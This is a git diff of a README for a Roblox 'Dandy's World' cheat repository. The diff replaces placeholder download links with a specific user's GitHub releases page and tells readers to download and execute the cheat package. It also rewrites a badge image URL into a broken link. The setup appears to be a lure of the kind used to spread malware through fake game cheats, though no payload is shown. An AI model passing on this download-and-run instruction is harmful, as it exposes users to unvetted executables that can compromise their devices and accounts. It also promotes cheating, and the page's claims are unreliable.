@@ -2,7 +2,7 @@
 
 Welcome to the Dandy's World Cheat repository! This repository offers various cheats for the popular Roblox game, Dandy's World 2025. With our tools, you can enhance your gameplay experience significantly. 
 
-![Dandy's World](https://img.shields.io/badge/Dandy's%20World-2025-brightgreen)
+![Dandy's World](https://github.com/PedroHumire/Dandys-World/releases's%20World-2025-brightgreen)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the Dandy's World Cheat repository! This repository offers various ch
 
 Dandy's World is an engaging and immersive Roblox game that allows players to explore a vibrant universe. However, some players seek to gain an edge. This repository provides cheats that help players navigate the game with ease. 
 
-You can download the cheat package from the following link: [Download Dandy's World Cheats](https://github.com/repo/user/archive.zip). After downloading, please execute the file to set up the cheats.
+You can download the cheat package from the following link: [Download Dandy's World Cheats](https://github.com/PedroHumire/Dandys-World/releases). After downloading, please execute the file to set up the cheats.
 
 ## Features
 
@@ -37,7 +37,7 @@ These features aim to enhance your gameplay experience and provide you with a un
 
 To install the cheats, follow these steps:
 
-1. **Download the Cheats**: Click on the link to download the cheat package: [Download Dandy's World Cheats](https://github.com/repo/user/archive.zip).
+1. **Download the Cheats**: Click on the link to download the cheat package: [Download Dandy's World Cheats](https://github.com/PedroHumire/Dandys-World/releases).
    
 2. **Extract the Files**: After downloading, extract the files from the ZIP archive.
 
